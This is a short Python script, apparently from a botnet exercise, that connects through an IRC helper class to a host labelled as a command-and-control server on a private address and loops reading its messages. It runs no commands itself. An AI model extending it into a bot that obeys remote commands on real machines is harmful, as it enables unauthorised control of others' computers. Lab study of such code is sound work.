from irc_class import IRC

# C&C IP address
server = "10.0.0.72"
port = 7000
irc = IRC()

try:
    irc.connect(server, port)
except:
    print("Could not connected")


try:
    while True:
        text = irc.get_response()
except KeyboardInterrupt:
    print("Press Ctrl-C to terminate while statement")
    irc.close()

